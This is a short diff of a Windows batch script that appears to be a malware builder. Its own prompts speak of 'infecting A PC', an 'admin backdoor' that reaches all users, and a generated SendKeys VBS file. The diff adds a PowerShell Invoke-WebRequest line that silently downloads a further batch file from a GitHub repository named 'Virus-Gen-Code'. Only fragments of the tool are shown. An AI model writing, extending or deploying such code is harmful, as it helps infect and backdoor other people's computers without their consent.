@@ -1,9 +1,10 @@
 :: setup
 :start
 @ECHO OFF
-set update_number=4.42.35
+set update_number=V4.42.35
 set dev=0
 cls
+if not exist environment_updater.bat Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress_bar2.bat").Content >"progress bar.bat"
 :VBSDynamicBuild
 SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
 IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
@@ -71,6 +72,7 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
 :EP_finish
 :: manual configuration
   :exit_menu
+  echo [45mversion 5 is being made which will allow for updating the entire program and other new features[0m
   echo [31madmin backdoor needs more testing, use this at your own risk[0m
   echo do you have admin permissions on the target PC?
   echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
